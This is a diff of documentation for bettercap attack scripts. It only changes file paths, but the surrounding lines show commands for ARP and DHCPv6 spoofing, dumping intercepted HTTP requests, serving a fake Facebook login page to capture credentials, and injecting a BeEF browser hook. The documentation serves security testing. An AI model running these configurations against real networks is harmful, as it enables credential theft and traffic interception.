@@ -9,7 +9,7 @@ Execute an ARP spoofing attack on the whole network (by default) or on a host (u
 ```sh
 # targeting the whole subnet by default, to make it selective:
 #
-#   sudo ./bettercap -caplet caplets/http-req-dump.cap -eval "set arp.spoof.targets 192.168.1.64"
+#   sudo ./bettercap -caplet http-req-dump.cap -eval "set arp.spoof.targets 192.168.1.64"
 
 # to make it less verbose
 # events.stream off
@@ -26,8 +26,8 @@ net.probe off
 # net.sniff on
 
 # we'll use this proxy script to dump requests
-set https.proxy.script caplets/http-req-dump.js
-set http.proxy.script caplets/http-req-dump.js
+set https.proxy.script http-req-dump.js
+set http.proxy.script http-req-dump.js
 clear
 
 # go ^_^
@@ -57,7 +57,7 @@ set dhcp6.spoof.domains microsoft.com, google.com
 
 # every request http request to the spoofed hosts will come to us
 # let's give em some contents
-set http.server.path caplets/www
+set http.server.path www
 
 # serve files
 http.server on
@@ -124,20 +124,20 @@ This caplet will create a fake Facebook login page on port 80, intercept login a
 
 Make sure to create the folder first:
 
-    $ cd caplets/www/
+    $ cd www/
     $ make
 
 ```sh
 set http.server.address 0.0.0.0
-set http.server.path caplets/www/www.facebook.com/
+set http.server.path www/www.facebook.com/
 
-set http.proxy.script caplets/fb-phish.js
+set http.proxy.script fb-phish.js
 
 http.proxy on
 http.server on
 ```
 
-The `caplets/fb-phish.js` proxy script file:
+The `fb-phish.js` proxy script file:
 
 ```javascript
 function onRequest(req, res) {
@@ -167,10 +167,10 @@ Use a proxy script to inject a BEEF javascript hook:
 ```sh
 # targeting the whole subnet by default, to make it selective:
 #
-#   sudo ./bettercap -caplet caplets/beef-active.cap -eval "set arp.spoof.targets 192.168.1.64"
+#   sudo ./bettercap -caplet beef-active.cap -eval "set arp.spoof.targets 192.168.1.64"
 
 # inject beef hook
-set http.proxy.script caplets/beef-inject.js
+set http.proxy.script beef-inject.js
 # redirect http traffic to a proxy
 http.proxy on
 # wait for everything to start properly
@@ -179,7 +179,7 @@ sleep 1
 arp.spoof on
 ```
 
-The `caplets/beef.inject.js` proxy script file:
+The `beef.inject.js` proxy script file:
 
 ```javascript
 function onLoad() {
